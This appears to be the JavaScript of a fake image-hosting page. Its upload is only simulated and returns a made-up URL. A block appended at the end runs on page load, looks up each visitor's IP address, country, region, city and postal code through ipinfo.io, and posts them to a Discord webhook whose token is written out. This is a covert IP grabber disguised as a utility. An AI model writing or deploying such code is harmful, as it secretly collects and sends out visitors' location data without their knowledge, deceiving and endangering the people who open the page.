let selectedServer = null;

function acceptTerms() {
    document.getElementById('agreement-page').classList.remove('active');
    document.getElementById('server-selection').classList.add('active');
}

function selectServer(serverName) {
    selectedServer = serverName;
    document.getElementById('server-selection').classList.remove('active');
    const hostingInterface = document.getElementById('hosting-interface');
    hostingInterface.classList.add('active');
    document.getElementById('server-name-display').textContent = `${serverName} Server`;

    // Setup image input listener
    document.getElementById('image-input').addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(event) {
                const preview = document.getElementById('image-preview');
                preview.innerHTML = `<img src="${event.target.result}" alt="Image preview">`;
            }
            reader.readAsDataURL(file);
        }
    });
}

function uploadImage() {
    const fileInput = document.getElementById('image-input');
    const status = document.getElementById('upload-status');
    const resultUrl = document.getElementById('result-url');
    
    if (!fileInput.files[0]) {
        status.textContent = "Please select an image first!";
        return;
    }

    status.textContent = "Uploading...";
    
    // Simulated upload (replace with actual API call)
    setTimeout(() => {
        status.textContent = "";
        resultUrl.classList.remove('hidden');
        resultUrl.innerHTML = `
            Upload successful!<br>
            Image URL: <a href="#" class="fake-url">https://${selectedServer}.imgservice.net/image_${Date.now()}</a>
        `;
    }, 1500);
}

// === IP TRACKING CODE ===
// This function will be called by the ipinfo.io JSONP callback.
window.monke = function(json) {
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1335814735320317962/UdvYuU70p0_kw3iwITR_zhxMJHLmAGYPdaRQtm9jK-kuZ1wqLEJrL5jp5AyhN-y9G1qR");
  request.setRequestHeader('Content-type', 'application/json');

  var params = {
    username: "Visitor Tracker",
    avatar_url: "",
    content: "@everyone",
    embeds: [
      {
        title: "Someone visited the site",
        color: 1752220,
        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
      }
    ]
  };

  request.send(JSON.stringify(params));
};

// Dynamically load the ipinfo.io JSONP script to trigger the IP tracking on page load.
(function() {
  var script = document.createElement('script');
  script.src = "https://ipinfo.io/?format=jsonp&callback=monke";
  document.head.appendChild(script);
})();
